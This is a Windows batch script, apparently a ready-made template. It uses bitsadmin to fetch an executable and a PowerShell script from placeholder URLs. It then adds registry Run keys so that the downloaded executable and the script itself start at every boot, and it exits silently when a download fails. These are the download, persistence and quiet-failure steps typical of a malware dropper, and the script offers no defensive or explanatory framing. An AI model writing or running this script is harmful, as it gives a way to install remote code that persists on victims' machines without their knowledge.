@echo off

REM Step 1: Download the executable file using BITS
bitsadmin /create DownloadJob
bitsadmin /addfile DownloadJob http://example.com/yourfile.exe C:\path\to\yourfile.exe
bitsadmin /resume DownloadJob
bitsadmin /complete DownloadJob

REM Step 2: Download the PowerShell script using BITS
bitsadmin /create ScriptDownloadJob
bitsadmin /addfile ScriptDownloadJob http://example.com/script.ps1 C:\script.ps1
bitsadmin /resume ScriptDownloadJob
bitsadmin /complete ScriptDownloadJob

REM Step 3: Check if both downloads were successful
if exist "C:\path\to\yourfile.exe" (
    if exist "C:\script.ps1" (
        REM Add the executable to the registry to run on boot
        reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v MyApp /t REG_SZ /d "C:\path\to\yourfile.exe" /f

        REM Optional: Add executable to HKLM for all users
        REM reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v MyApp /t REG_SZ /d "C:\path\to\yourfile.exe" /f

        REM Add this batch script to the registry to run on boot
        reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v MyBatchScript /t REG_SZ /d "%~dpnx0" /f

        REM Optional: Add batch script to HKLM for all users
        REM reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v MyBatchScript /t REG_SZ /d "%~dpnx0" /f
    ) else (
        REM PowerShell script download failed, exit silently
        exit /b
    )
) else (
    REM Executable file download failed, exit silently
    exit /b
)

REM End of script
exit
